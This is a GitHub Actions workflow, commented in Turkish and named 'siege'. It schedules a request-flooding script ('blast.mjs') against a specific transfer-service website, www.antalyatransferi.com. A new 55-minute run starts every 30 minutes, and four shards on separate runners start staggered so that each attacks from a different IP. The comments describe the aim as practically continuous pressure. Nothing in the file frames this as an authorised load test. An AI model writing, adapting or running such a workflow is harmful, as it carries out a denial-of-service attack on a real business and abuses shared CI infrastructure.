name: kusatma

# Elle de tetiklenebilir; zamanlanmis calisma her 30 dakikada bir yeni tur acar.
# Her tur 55 dakika kosar, 4 shard kademeli baslar -> pratikte kesintisiz baski.
on:
  workflow_dispatch:
    inputs:
      concurrency:
        description: "Shard basina eszamanli istek"
        default: "25"
      duration:
        description: "Saniye cinsinden sure"
        default: "3000"
  schedule:
    - cron: "*/30 * * * *"

concurrency:
  group: kusatma
  cancel-in-progress: false

jobs:
  blast:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    strategy:
      fail-fast: false
      matrix:
        # Her shard ayri bir runner = ayri bir IP.
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: "22"

      - name: Kademeli baslat
        run: sleep $(( ${{ matrix.shard }} * 7 ))

      - name: Baskiyi surdur
        env:
          C: ${{ github.event.inputs.concurrency || '25' }}
          D: ${{ github.event.inputs.duration || '3000' }}
        run: node blast.mjs --url https://www.antalyatransferi.com/ --concurrency "$C" --seconds "$D" --timeout 25000
